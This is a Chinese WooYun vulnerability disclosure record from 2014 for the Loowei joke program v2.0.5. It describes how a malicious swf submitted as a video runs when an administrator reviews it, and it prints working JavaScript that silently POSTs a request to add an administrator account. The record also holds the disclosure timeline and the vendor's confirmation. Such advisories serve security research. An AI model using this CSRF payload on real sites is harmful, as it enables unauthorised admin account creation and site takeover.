{"id": 54708, "wybug_id": "wooyun-2014-063615", "wybug_title": "Loowei笑话程序 v2.0.5 csrf添加管理员", "wybug_corp": "loowei.com", "wybug_author": "roker", "wybug_date": "2014-06-09 20:33", "wybug_open_date": "2014-09-07 20:34", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-12：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-07：\t细节向公众公开  简要描述： 对 swf文件处理不当 详细说明：  对于 输入的代码 都进行了HTML实体转义。但是，添加视频时发现一个很有趣的现象。添加一个 外部swf链接 \n\n后台审核时 看源代码。\n<embed src=\"http://www.xxx.com/xss.swf\" type=\"application/x-shockwave-flash\" allowfullscreen=\"true\" allownetworking=\"all\" allowscriptaccess=\"always\">\nallowfullscreen=\"true\" allownetworking=\"all\" allowscriptaccess=\"always\" ......为毛？我们可以 构造一个恶意的 swf文件\n\n审核触发\n\n你可能会说 alert有毛用，在同源策略下，是无法接收到 cookie之类的数据的。然而使用 CORS 的话 我们是可以 ajax post 发送数据的，代码如下：\n﻿﻿﻿﻿﻿﻿var request = false; if(window.XMLHttpRequest) { request = new XMLHttpRequest(); if(request.overrideMimeType) { request.overrideMimeType('text/xml'); } } else if (window.ActiveXObject) { var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0','Msxml2.XMLHTTP.6.0','Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP']; for(var i=0; i<versions.length; i++) { try { request = new ActiveXObject(versions); } catch(e) {} } } xmlhttp=request; url = \"http://xxx.com/admin.php?m=admin&a=modify\";var params ='admin_name=wooyun&admin_pwd=wooyun&admin_realname=11&admin_qq=&admin_phone=&admin_level=1&admin_status=1'; xmlhttp.open(\"POST\", url, true); xmlhttp.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\"); xmlhttp.setRequestHeader(\"Content-length\", params.length); xmlhttp.setRequestHeader(\"Connection\", \"Keep-Alive\"); xmlhttp.setRequestHeader(\"Accept\", \"text/html,application/xhtm+xml,application/xml;q=0.9,*/*;q=0.8\");xmlhttp.withCredentials = \"true\";xmlhttp.send(params);\n测试成功\n\n   漏洞证明：  如上所述   修复方案：  加强安全意识   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-06-09 21:17 厂商回复： 问题已知，感谢您的帮助。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-05-13 22:35 |    \t\tResurrection \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:1        | 人生总会有一次被原谅的机会,是新生,亦是救...)\t\t \n  这个思路好流弊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}